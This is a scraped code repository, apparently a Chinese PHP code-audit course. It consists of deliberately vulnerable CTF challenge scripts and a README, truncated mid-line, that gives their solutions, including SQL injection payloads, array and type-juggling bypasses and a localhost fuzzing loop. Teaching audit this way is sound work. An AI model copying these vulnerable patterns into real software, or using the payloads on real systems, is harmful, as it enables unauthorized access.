@@ -1,0 +1,209 @@
+{
+  "metadata": {
+    "timestamp": 1736712067225,
+    "page": 614,
+    "hasNextPage": true,
+    "endCursor": "Y3Vyc29yOjYyMA==",
+    "completionStatus": "IN_PROGRESS"
+  },
+  "repositories": [
+    {
+      "nameWithOwner": "bowu678/php_bugs",
+      "stars": 1691,
+      "defaultBranch": "master",
+      "files": [
+        {
+          "name": "01 extract变量覆盖.php",
+          "type": "blob",
+          "size": 0.2099609375,
+          "content": "<?php\n\n$flag='xxx'; \nextract($_GET);\n if(isset($shiyan))\n { \n    $content=trim(file_get_contents($flag));\n    if($shiyan==$content)\n    { \n        echo'ctf{xxx}'; \n    }\n   else\n   { \n    echo'Oh.no';\n   } \n   }\n\n?>"
+        },
+        {
+          "name": "02 绕过过滤的空白字符.php",
+          "type": "blob",
+          "size": 1.8779296875,
+          "content": "<?php\n \n$info = \"\"; \n$req = [];\n$flag=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";\n \nini_set(\"display_error\", false); //为一个配置选项设置值\nerror_reporting(0); //关闭所有PHP错误报告\n \nif(!isset($_GET['number'])){\n   header(\"hint:26966dc52e85af40f59b4fe73d8c323a.txt\"); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt\n \n   die(\"have a fun!!\"); //die — 等同于 exit()\n \n}\n \nforeach([$_GET, $_POST] as $global_var) {  //foreach 语法结构提供了遍历数组的简单方式 \n    foreach($global_var as $key => $value) { \n        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）\n        is_string($value) && $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串\n    } \n} \n \n \nfunction is_palindrome_number($number) { \n    $number = strval($number); //strval — 获取变量的字符串值\n    $i = 0; \n    $j = strlen($number) - 1; //strlen — 获取字符串长度\n    while($i < $j) { \n        if($number[$i] !== $number[$j]) { \n            return false; \n        } \n        $i++; \n        $j--; \n    } \n    return true; \n} \n \n \nif(is_numeric($_REQUEST['number'])) //is_numeric — 检测变量是否为数字或数字字符串 \n{\n \n   $info=\"sorry, you cann't input a number!\";\n \n}\nelseif($req['number']!=strval(intval($req['number']))) //intval — 获取变量的整数值\n{\n \n     $info = \"number must be equal to it's integer!! \";  \n \n}\nelse\n{\n \n     $value1 = intval($req[\"number\"]);\n     $value2 = intval(strrev($req[\"number\"]));  \n \n     if($value1!=$value2){\n          $info=\"no, this is not a palindrome number!\";\n     }\n     else\n     {\n \n          if(is_palindrome_number($req[\"number\"])){\n              $info = \"nice! {$value1} is a palindrome number!\"; \n          }\n          else\n          {\n             $info=$flag;\n          }\n     }\n \n}\n \necho $info;"
+        },
+        {
+          "name": "03 多重加密.php",
+          "type": "blob",
+          "size": 1.5888671875,
+          "content": "<?php\n    include 'common.php';\n    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);\n    //把一个或多个数组合并为一个数组\n    class db\n    {\n        public $where;\n        function __wakeup()\n        {\n            if(!empty($this->where))\n            {\n                $this->select($this->where);\n            }\n        }\n        function select($where)\n        {\n            $sql = mysql_query('select * from user where '.$where);\n            //函数执行一条 MySQL 查询。\n            return @mysql_fetch_array($sql);\n            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false\n        }\n    }\n\n    if(isset($requset['token']))\n    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。\n    {\n        $login = unserialize(gzuncompress(base64_decode($requset['token'])));\n        //gzuncompress:进行字符串压缩\n        //unserialize: 将已序列化的字符串还原回 PHP 的值\n\n        $db = new db();\n        $row = $db->select('user=\\''.mysql_real_escape_string($login['user']).'\\'');\n        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。\n\n        if($login['user'] === 'ichunqiu')\n        {\n            echo $flag;\n        }else if($row['pass'] !== $login['pass']){\n            echo 'unserialize injection!!';\n        }else{\n            echo \"(╯‵□′)╯︵┴─┴ \";\n        }\n    }else{\n        header('Location: index.php?error=1');\n    }\n\n?> "
+        },
+        {
+          "name": "04 SQL注入_WITH ROLLUP绕过.php",
+          "type": "blob",
+          "size": 1.568359375,
+          "content": "<?php\nerror_reporting(0);\n\nif (!isset($_POST['uname']) || !isset($_POST['pwd'])) {\n    echo '<form action=\"\" method=\"post\">'.\"<br/>\";\n    echo '<input name=\"uname\" type=\"text\"/>'.\"<br/>\";\n    echo '<input name=\"pwd\" type=\"text\"/>'.\"<br/>\";\n    echo '<input type=\"submit\" />'.\"<br/>\";\n    echo '</form>'.\"<br/>\";\n    echo '<!--source: source.txt-->'.\"<br/>\";\n    die;\n}\n\nfunction AttackFilter($StrKey,$StrValue,$ArrReq){  \n    if (is_array($StrValue)){\n\n//检测变量是否是数组\n\n        $StrValue=implode($StrValue);\n\n//返回由数组元素组合成的字符串\n\n    }\n    if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1){   \n\n//匹配成功一次后就会停止匹配\n\n        print \"水可载舟，亦可赛艇！\";\n        exit();\n    }\n}\n\n$filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\";\nforeach($_POST as $key=>$value){ \n\n//遍历数组\n\n    AttackFilter($key,$value,$filter);\n}\n\n$con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\");\nif (!$con){\n    die('Could not connect: ' . mysql_error());\n}\n$db=\"XXXXXX\";\nmysql_select_db($db, $con);\n\n//设置活动的 MySQL 数据库\n\n$sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\";\n$query = mysql_query($sql); \n\n//执行一条 MySQL 查询\n\nif (mysql_num_rows($query) == 1) { \n\n//返回结果集中行的数目\n\n    $key = mysql_fetch_array($query);\n\n//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false\n\n    if($key['pwd'] == $_POST['pwd']) {\n        print \"CTF{XXXXXX}\";\n    }else{\n        print \"亦可赛艇！\";\n    }\n}else{\n    print \"一颗赛艇！\";\n}\nmysql_close($con);\n?>"
+        },
+        {
+          "name": "05 ereg正则%00截断.php",
+          "type": "blob",
+          "size": 0.5537109375,
+          "content": "<?php \n\n$flag = \"flag\";\n\nif (isset ($_GET['password'])) \n{\n  if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\n  {\n    echo '<p>You password must be alphanumeric</p>';\n  }\n  else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)\n   {\n     if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置\n      {\n      die('Flag: ' . $flag);\n      }\n      else\n      {\n        echo('<p>*-* have not been found</p>'); \n       }\n      }\n     else \n     {\n        echo '<p>Invalid password</p>'; \n      }\n   } \n?>"
+        },
+        {
+          "name": "06 strcmp比较字符串.php",
+          "type": "blob",
+          "size": 0.310546875,
+          "content": "<?php\n$flag = \"flag\";\nif (isset($_GET['a'])) {  \n    if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。 \n\n    //比较两个字符串（区分大小写） \n        die('Flag: '.$flag);  \n    else  \n        print 'No';  \n}\n\n?>"
+        },
+        {
+          "name": "07 sha()函数比较绕过.php",
+          "type": "blob",
+          "size": 0.3564453125,
+          "content": "<?php\n\n$flag = \"flag\";\n\nif (isset($_GET['name']) and isset($_GET['password'])) \n{\n    if ($_GET['name'] == $_GET['password'])\n        echo '<p>Your password can not be your name!</p>';\n    else if (sha1($_GET['name']) === sha1($_GET['password']))\n      die('Flag: '.$flag);\n    else\n        echo '<p>Invalid password.</p>';\n}\nelse\n    echo '<p>Login first!</p>';\n?>"
+        },
+        {
+          "name": "08 SESSION验证绕过.php",
+          "type": "blob",
+          "size": 0.2763671875,
+          "content": "<?php\n\n$flag = \"flag\";\n\nsession_start(); \nif (isset ($_GET['password'])) {\n    if ($_GET['password'] == $_SESSION['password'])\n        die ('Flag: '.$flag);\n    else\n        print '<p>Wrong guess.</p>';\n}\nmt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));\n?>"
+        },
+        {
+          "name": "09 密码md5比较绕过.php",
+          "type": "blob",
+          "size": 0.9853515625,
+          "content": "<?php\n\n//配置数据库\nif($_POST[user] && $_POST[pass]) {\n    $conn = mysql_connect(\"********, \"*****\", \"********\");\n    mysql_select_db(\"phpformysql\") or die(\"Could not select database\");\n    if ($conn->connect_error) {\n        die(\"Connection failed: \" . mysql_error($conn));\n} \n\n//赋值\n\n$user = $_POST[user];\n$pass = md5($_POST[pass]);\n\n//sql语句\n\n// select pw from php where user='' union select 'e10adc3949ba59abbe56e057f20f883e' # \n\n// ?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&pass=123456\n\n$sql = \"select pw from php where user='$user'\";\n$query = mysql_query($sql);\nif (!$query) {\n    printf(\"Error: %s\\n\", mysql_error($conn));\n    exit();\n}\n$row = mysql_fetch_array($query, MYSQL_ASSOC);\n//echo $row[\"pw\"];\n\n  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {\n\n//如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。\n\n\n    echo \"<p>Logged in! Key:************** </p>\";\n}\nelse {\n    echo(\"<p>Log in failure!</p>\");\n\n  }\n}\n?>"
+        },
+        {
+          "name": "10 urldecode二次编码绕过.php",
+          "type": "blob",
+          "size": 0.22265625,
+          "content": "<?php\nif(eregi(\"hackerDJ\",$_GET[id])) {\n  echo(\"<p>not allowed!</p>\");\n  exit();\n}\n\n$_GET[id] = urldecode($_GET[id]);\nif($_GET[id] == \"hackerDJ\")\n{\n  echo \"<p>Access granted!</p>\";\n  echo \"<p>flag: *****************} </p>\";\n}\n?>"
+        },
+        {
+          "name": "11 sql闭合绕过.php",
+          "type": "blob",
+          "size": 0.7509765625,
+          "content": "<?php\n\n\nif($_POST[user] && $_POST[pass]) {\n    $conn = mysql_connect(\"*******\", \"****\", \"****\");\n    mysql_select_db(\"****\") or die(\"Could not select database\");\n    if ($conn->connect_error) {\n        die(\"Connection failed: \" . mysql_error($conn));\n} \n$user = $_POST[user];\n$pass = md5($_POST[pass]);\n\n//select user from php where (user='admin')#\n\n//exp:admin')#\n\n$sql = \"select user from php where (user='$user') and (pw='$pass')\";\n$query = mysql_query($sql);\nif (!$query) {\n    printf(\"Error: %s\\n\", mysql_error($conn));\n    exit();\n}\n$row = mysql_fetch_array($query, MYSQL_ASSOC);\n//echo $row[\"pw\"];\n  if($row['user']==\"admin\") {\n    echo \"<p>Logged in! Key: *********** </p>\";\n  }\n\n  if($row['user'] != \"admin\") {\n    echo(\"<p>You are not admin!</p>\");\n  }\n}\n\n?>\n"
+        },
+        {
+          "name": "12 X-Forwarded-For绕过指定IP地址.php",
+          "type": "blob",
+          "size": 0.447265625,
+          "content": "<?php\nfunction GetIP(){\nif(!empty($_SERVER[\"HTTP_CLIENT_IP\"]))\n    $cip = $_SERVER[\"HTTP_CLIENT_IP\"];\nelse if(!empty($_SERVER[\"HTTP_X_FORWARDED_FOR\"]))\n    $cip = $_SERVER[\"HTTP_X_FORWARDED_FOR\"];\nelse if(!empty($_SERVER[\"REMOTE_ADDR\"]))\n    $cip = $_SERVER[\"REMOTE_ADDR\"];\nelse\n    $cip = \"0.0.0.0\";\nreturn $cip;\n}\n\n$GetIPs = GetIP();\nif ($GetIPs==\"1.1.1.1\"){\necho \"Great! Key is *********\";\n}\nelse{\necho \"错误！你的IP不在访问列表之内！\";\n}\n?>"
+        },
+        {
+          "name": "13 md5加密相等绕过.php",
+          "type": "blob",
+          "size": 0.21875,
+          "content": "<?php\n\n$md51 = md5('QNKCDZO');\n$a = @$_GET['a'];\n$md52 = @md5($a);\nif(isset($a)){\nif ($a != 'QNKCDZO' && $md51 == $md52) {\n    echo \"nctf{*****************}\";\n} else {\n    echo \"false!!!\";\n}}\nelse{echo \"please input a\";}\n\n?>"
+        },
+        {
+          "name": "14 intval函数四舍五入.php",
+          "type": "blob",
+          "size": 0.3583984375,
+          "content": "<?php\n\nif($_GET[id]) {\n   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n  mysql_select_db(SAE_MYSQL_DB);\n  $id = intval($_GET[id]);\n  $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\n  if ($_GET[id]==1024) {\n      echo \"<p>no! try again</p>\";\n  }\n  else{\n    echo($query[content]);\n  }\n}\n\n?>"
+        },
+        {
+          "name": "15 strpos数组绕过NULL与ereg正则%00截断.php",
+          "type": "blob",
+          "size": 0.32421875,
+          "content": "<?php\n\n$flag = \"flag\";\n\n    if (isset ($_GET['nctf'])) {\n        if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE)\n            echo '必须输入数字才行';\n        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   \n            die('Flag: '.$flag);\n        else\n            echo '骚年，继续努力吧啊~';\n    }\n\n ?>"
+        },
+        {
+          "name": "16 SQL注入or绕过.php",
+          "type": "blob",
+          "size": 0.8125,
+          "content": "<?php\n\n#GOAL: login as admin,then get the flag;\nerror_reporting(0);\nrequire 'db.inc.php';\n\nfunction clean($str){\n    if(get_magic_quotes_gpc()){ //get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置\n        $str=stripslashes($str); //返回一个去除转义反斜线后的字符串（\\' 转换为 ' 等等）。双反斜线（\\\\）被转换为单个反斜线（\\）。 \n    }\n    return htmlentities($str, ENT_QUOTES);\n}\n\n$username = @clean((string)$_GET['username']);\n$password = @clean((string)$_GET['password']);\n\n//$query='SELECT * FROM users WHERE name=\\''admin\\'\\' AND pass=\\''or 1 #'\\';';\n\n$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';\n$result=mysql_query($query);\nif(!$result || mysql_num_rows($result) < 1){\n    die('Invalid password!');\n}\n\necho $flag;\n\n?>"
+        },
+        {
+          "name": "17 密码md5比较绕过.php",
+          "type": "blob",
+          "size": 0.517578125,
+          "content": "<?php\n\nif($_POST[user] && $_POST[pass]) {\n   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n  mysql_select_db(SAE_MYSQL_DB);\n  $user = $_POST[user];\n  $pass = md5($_POST[pass]);\n  $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user=' $user '\"));\n  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {\n\n    //strcasecmp:0 - 如果两个字符串相等\n\n      echo \"<p>Logged in! Key: ntcf{**************} </p>\";\n  }\n  else {\n    echo(\"<p>Log in failure!</p>\");\n  }\n}\n\n?>"
+        },
+        {
+          "name": "18 md5()函数===使用数组绕过.php",
+          "type": "blob",
+          "size": 0.345703125,
+          "content": "<?php\nerror_reporting(0);\n$flag = 'flag{test}';\nif (isset($_GET['username']) and isset($_GET['password'])) {\n    if ($_GET['username'] == $_GET['password'])\n        print 'Your password can not be your username.';\n    else if (md5($_GET['username']) === md5($_GET['password']))\n        die('Flag: '.$flag);\n    else\n        print 'Invalid password';\n}\n?>"
+        },
+        {
+          "name": "19 ereg()函数strpos() 函数用数组返回NULL绕过.php",
+          "type": "blob",
+          "size": 0.318359375,
+          "content": "<?php  \n\n$flag = \"flag\";  \n   \nif (isset ($_GET['password'])) {  \n    if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)  \n        echo 'You password must be alphanumeric';  \n    else if (strpos ($_GET['password'], '--') !== FALSE)  \n        die('Flag: ' . $flag);  \n    else  \n        echo 'Invalid password';  \n}  \n?>"
+        },
+        {
+          "name": "20 十六进制与数字比较.php",
+          "type": "blob",
+          "size": 0.6455078125,
+          "content": "<?php\n\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n    $flag = 'flag{test}';\n    $one = ord('1');  //ord — 返回字符的 ASCII 码值\n    $nine = ord('9'); //ord — 返回字符的 ASCII 码值\n    $number = '3735929054';\n    // Check all the input characters!\n    for ($i = 0; $i < strlen($number); $i++)\n    { \n        // Disallow all the digits!\n        $digit = ord($temp{$i});\n        if ( ($digit >= $one) && ($digit <= $nine) )\n        {\n            // Aha, digit not allowed!\n            return \"flase\";\n        }\n    }\n    if($number == $temp)\n        return $flag;\n}\n$temp = $_GET['password'];\necho noother_says_correct($temp);\n\n?>"
+        },
+        {
+          "name": "21 数字验证正则绕过.php",
+          "type": "blob",
+          "size": 0.984375,
+          "content": "<?php\n\nerror_reporting(0);\n$flag = 'flag{test}';\nif  (\"POST\" == $_SERVER['REQUEST_METHOD']) \n{ \n    $password = $_POST['password']; \n    if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password)) //preg_match — 执行一个正则表达式匹配\n    { \n        echo 'Wrong Format'; \n        exit; \n    } \n    while (TRUE) \n    { \n        $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; \n        if (6 > preg_match_all($reg, $password, $arr)) \n            break; \n        $c = 0; \n        $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 \n        foreach ($ps as $pt) \n        { \n            if (preg_match(\"/[[:$pt:]]+/\", $password)) \n                $c += 1; \n        } \n        if ($c < 3) break; \n        //>=3，必须包含四种类型三种与三种以上\n        if (\"42\" == $password) echo $flag; \n        else echo 'Wrong password'; \n        exit; \n    } \n}\n\n?>"
+        },
+        {
+          "name": "22 弱类型整数大小比较绕过.php",
+          "type": "blob",
+          "size": 0.1572265625,
+          "content": "<?php\n\nerror_reporting(0);\n$flag = \"flag{test}\";\n\n$temp = $_GET['password'];\nis_numeric($temp)?die(\"no numeric\"):NULL;    \nif($temp>1336){\n    echo $flag;\n} \n\n?>"
+        },
+        {
+          "name": "23 md5函数验证绕过.php",
+          "type": "blob",
+          "size": 0.11328125,
+          "content": "<?php\n\nerror_reporting(0);\n$flag = 'flag{test}';\n$temp = $_GET['password'];\nif(md5($temp)==0){\n    echo $flag;\n}\n\n?>"
+        },
+        {
+          "name": "24 md5函数true绕过注入.php",
+          "type": "blob",
+          "size": 0.52734375,
+          "content": "<?php \nerror_reporting(0);\n$link = mysql_connect('localhost', 'root', 'root');\nif (!$link) { \n  die('Could not connect to MySQL: ' . mysql_error()); \n} \n// 选择数据库\n$db = mysql_select_db(\"security\", $link);\nif(!$db)\n{\n  echo 'select db error';\n  exit();\n}\n// 执行sql\n$password = $_GET['password'];\n$sql = \"SELECT * FROM users WHERE password = '\".md5($password,true).\"'\";\nvar_dump($sql);\n$result=mysql_query($sql) or die('<pre>' . mysql_error() . '</pre>' );\n$row1 = mysql_fetch_row($result);\nvar_dump($row1);\nmysql_close($link);\n?>"
+        },
+        {
+          "name": "25 switch没有break 字符与0比较绕过.php",
+          "type": "blob",
+          "size": 0.318359375,
+          "content": "<?php\n\nerror_reporting(0);\n\nif (isset($_GET['which']))\n{\n    $which = $_GET['which'];\n    switch ($which)\n    {\n    case 0:\n    case 1:\n    case 2:\n        require_once $which.'.php';\n         echo $flag;\n        break;\n    default:\n        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);\n        break;\n    }\n}\n\n?>"
+        },
+        {
+          "name": "26 unserialize()序列化.php",
+          "type": "blob",
+          "size": 1.021484375,
+          "content": "<!-- 题目：http://web.jarvisoj.com:32768 -->\n\n<!-- index.php -->\n<?php \n\trequire_once('shield.php');\n\t$x = new Shield();\n\tisset($_GET['class']) && $g = $_GET['class'];\n\tif (!empty($g)) {\n\t\t$x = unserialize($g);\n\t}\n\techo $x->readfile();\n?>\n<img src=\"showimg.php?img=c2hpZWxkLmpwZw==\" width=\"100%\"/>\n\n<!-- shield.php -->\n\n<?php\n\t//flag is in pctf.php\n\tclass Shield {\n\t\tpublic $file;\n\t\tfunction __construct($filename = '') {\n\t\t\t$this -> file = $filename;\n\t\t}\n\t\t\n\t\tfunction readfile() {\n\t\t\tif (!empty($this->file) && stripos($this->file,'..')===FALSE  \n\t\t\t&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n\t\t\t\treturn @file_get_contents($this->file);\n\t\t\t}\n\t\t}\n\t}\n?>\n\n<!-- showimg.php -->\n<?php\n\t$f = $_GET['img'];\n\tif (!empty($f)) {\n\t\t$f = base64_decode($f);\n\t\tif (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\\\')===FALSE\n\t\t//stripos — 查找字符串首次出现的位置（不区分大小写）\n\t\t&& stripos($f,'pctf')===FALSE) {\n\t\t\treadfile($f);\n\t\t} else {\n\t\t\techo \"File not found!\";\n\t\t}\n\t}\n?>\n\n"
+        },
+        {
+          "name": "27.php",
+          "type": "blob",
+          "size": 0.3994140625,
+          "content": "<?php\nif(!$_GET['id']) {\n\theader('Location:\n  index.php?id=1');\n\texit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.')) \n\techo 'Hahahahahaha';\n\treturn ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"1112 is a nice lab!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4) {\n\trequire(\"flag.txt\");\n} else {\n\tprint \"work harder!harder!harder!\";\n}\n?>"
+        },
+        {
+          "name": "28.php",
+          "type": "blob",
+          "size": 1.2177734375,
+          "content": "<!DOCTYPE html>\n<html>\n<head>\n<title>Web 350</title>\n<style type=\"text/css\">\n        body {\n                background:gray;\n                text-align:center;\n        }\n</style>\n</head>\n\n<body>\n        <?php\n                $auth = false;\n                $role = \"guest\";\n                $salt =\n                if (isset($_COOKIE[\"role\"])) {\n                        $role = unserialize($_COOKIE[\"role\"]);\n                        $hsh = $_COOKIE[\"hsh\"];\n                        if ($role===\"admin\" && $hsh === md5($salt.strrev($_COOKIE[\"role\"])))\n// strrev返回 string 反转后的字符串。 \n                         {\n                                $auth = true;\n                        } else {\n                                $auth = false;\n                        }\n                } else {\n                        $s = serialize($role);\n                        setcookie('role',$s);\n                        $hsh = md5($salt.strrev($s));\n                        setcookie('hsh',$hsh);\n                }\n                if ($auth) {\n                        echo \"<h3>Welcome Admin. Your flag is \n                } else {\n                        echo \"<h3>Only Admin can see the flag!!</h3>\";\n                }\n        ?>\n        \n</body>\n"
+        },
+        {
+          "name": "29.php",
+          "type": "blob",
+          "size": 0.2470703125,
+          "content": "<?php\n\nrequire(\"config.php\");\n$table = $_GET['table']?$_GET['table']:\"test\";\n$table = Filter($table);\nmysqli_query($mysqli,\"desc `secret_{$table}`\") or Hacker();\n$sql = \"select 'flag{xxx}' from secret_{$table}\";\n$ret = sql_query($sql);\necho $ret[0];\n\n?>"
+        },
+        {
+          "name": "30 利用提交数组绕过逻辑.php",
+          "type": "blob",
+          "size": 1.216796875,
+          "content": "<?php \n$role = \"guest\";\n$flag = \"flag{test_flag}\";\n$auth = false;\nif(isset($_COOKIE[\"role\"])){\n    $role = unserialize(base64_decode($_COOKIE[\"role\"]));\n    if($role === \"admin\"){\n        $auth = true;\n    }\n    else{\n        $auth = false;\n    }\n}\nelse{\n    $role = base64_encode(serialize($role));\n    setcookie('role',$role);\n}\nif($auth){\n    if(isset($_POST['filename'])){\n        $filename = $_POST['filename'];\n        $data = $_POST['data'];\n        if(preg_match('[<>?]', $data)) {\n            die('No No No!'.$data);\n        }\n        else {\n            $s = implode($data);\n            if(!preg_match('[<>?]', $s)){\n                $flag='None.';\n            }\n            $rand = rand(1,10000000);\n            $tmp=\"./uploads/\".md5(time() + $rand).$filename;\n            file_put_contents($tmp, $flag);\n            echo \"your file is in \" . $tmp;\n        }\n    }\n    else{\n        echo \"Hello admin, now you can upload something you are easy to forget.\";\n        echo \"<br />there are the source.<br />\";\n        echo '<textarea rows=\"10\" cols=\"100\">';\n        echo htmlspecialchars(str_replace($flag,'flag{???}',file_get_contents(__FILE__)));\n        echo '</textarea>';\n    }\n}\nelse{\n    echo \"Sorry. You have no permissions.\";\n}\n?>\n"
+        },
+        {
+          "name": "README.md",
+          "type": "blob",
+          "size": 17.0869140625,
+          "content": "﻿# PHP代码审计分段讲解\n\n- **作  者：bowu**\n- **网  站：[Bowu‘ s Blog](http://www.bowu8.com)**\n- **Github: [bowu (Github)](https://github.com/bowu678/php_bugs)**\n- **本项目将会持续更新，请`Star`予以支持，感谢亲 :)**\n\n## 关于本项目\n\n代码审计对于很多安全圈的新人来说，一直是一件头疼的事情，也想跟着大牛们直接操刀审计CMS？却处处碰壁：\n\n- 函数看不懂！\n- 漏洞原理不知道！\n- PHP特性更不知！\n\n**那还怎么愉快审计？**\n\n不如**化繁为简**，跟着本项目先搞懂PHP中大多敏感函数与各类特性，再逐渐增加难度，直到可以吊打各类CMS~\n\n> 本项目讲解基于多道CTF题，玩CTF的WEB狗也不要错过(＾－＾)V\n\n> 题的源码在Github: [bowu (Github)](https://github.com/bowu678/php_bugs)，可以自行部署，也可以静态审计。\n\n**欢迎贡献题目与解答，代表各位小白感激不尽~**\n\n## 01 extract变量覆盖\n\n`http://127.0.0.1/Php_Bug/extract1.php?shiyan=&flag=1`\n\n## 02 绕过过滤的空白字符\n\n可以引入\\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响。\n\n`http://127.0.0.1/Php_Bug/02.php?number=%00%0c191`\n\nFuzzing思路：\n `http://127.0.0.1/Php_Bug/02.php?number=%00%2B191`\n%2B解析后为+，‘+191'=='191'且intval('191+')==191\n(这道题解题思路如下\n1. 条件is_numeric($_REQUEST['number'])为假，这个绕过的方法很多使用%00开头也可以再POST一个number参数把GET中的覆盖掉也可以，所以这一步很简单。\n2. 要求 $req['number']==strval(intval($req['number']))\n3. 要求intval($req['number']) == intval(strrev($req['number']))\n4. is_palindrome_number()返回False，这个条件只要在一个回文数比如191前面加一个字符即可实现\n5. 得到flag\n看上述条件，条件4需要加字符但是加了之后需要满足2,3这两个条件所以就可以在原题目中简化出2,3,4来进行Fuzzing，简化后后端代码如下：\n```php\n<?php\nfunction is_palindrome_number($number) {\n    $number = strval($number); //strval — 获取变量的字符串值\n    $i = 0;\n    $j = strlen($number) - 1; //strlen — 获取字符串长度\n    while($i < $j) {\n        if($number[$i] !== $number[$j]) {\n            return false;\n        }\n        $i++;\n        $j--;\n    }\n    return true;\n}\n$a = trim($_GET['number']);\nvar_dump(($a==strval(intval($a)))&(intval($a)==intval(strrev($a)))&!is_palindrome_number($a))\n?>\n```\nFuzzing代码如下：\n```python\nimport requests\nfor i in range(256):\n    rq = requests.get(\"http://127.0.0.1/vuln/CTF/1/index.php?number=%s191\"%(\"%%%02X\"%i))\n    if '1' in rq.text:\n        print \"%%%02X\"%i\n```\nFuzzing结果如下:\n```\n%0C\n%2B\n```\n\n\n\n资料：\n\n- [PHP类型与逻辑+fuzz与源代码审计](http://www.chnpanda.com/961.html)\n\n## 03 多重加密\n\n```\n<?php\n\n$arr = array(['user'] === 'ichunqiu');\n$token = base64_encode(gzcompress(serialize($arr)));\nprint_r($token);\n// echo $token;\n\n?>\n```\n\n`eJxLtDK0qs60MrBOAuJaAB5uBBQ=`\n\n\n## 04 SQL注入_WITH ROLLUP绕过\n\n\n`admin' GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- - `\n\n资料：\n\n- [实验吧 因缺思汀的绕过 By Assassin（with rollup统计）](http://blog.csdn.net/qq_35078631/article/details/54772798)\n- [使用 GROUP BY WITH ROLLUP 改善统计性能](http://blog.csdn.net/id19870510/article/details/6254358)\n- [因缺思汀的绕过](http://www.bubuko.com/infodetail-2169730.html)\n\n## 05 ereg正则%00截断\n\nhttp://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*\n\n资料：\n\n- [eregi()](http://www.am0s.com/functions/203.html)\n\n## 06 strcmp比较字符串\n\n`http://127.0.0.1/Php_Bug/06.php?a[]=1`\n\n这个函数是用于比较字符串的函数\n\n```\nint strcmp ( string $str1 , string $str2 )\n// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。\n```\n\n可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在`5.3`之前的php中，显示了报错的警告信息后，将`return 0` !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。`strcmp`只会处理字符串参数，如果给个数组的话呢，就会返回`NULL`,而判断使用的是`==`，`NULL==0`是 `bool(true)`\n\n## 07 sha()函数比较绕过\n\n`http://127.0.0.1/Php_Bug/07.php?name[]=1&password[]=2`\n\n`===`会比较类型，比如`bool`\n`sha1()`函数和`md5()`函数存在着漏洞，`sha1()`函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使`sha1()`函数返回错误，也就是返回`false`，这样一来`===`运算符就可以发挥作用了，需要构造`username`和`password`既不相等，又同样是数组类型\n\n`?name[]=a&amp;password[]=b`\n\n## 08 SESSION验证绕过\n\n`http://127.0.0.1/Php_Bug/08.php?password=`\n\n删除`cookies`或者删除`cookies`的值\n\n资料：\n\n- [【Writeup】Boston Key Party CTF 2015(部分题目)](http://blog.csdn.net/lymingha0/article/details/44079981)\n\n## 09 密码md5比较绕过\n\n`?user=' union select 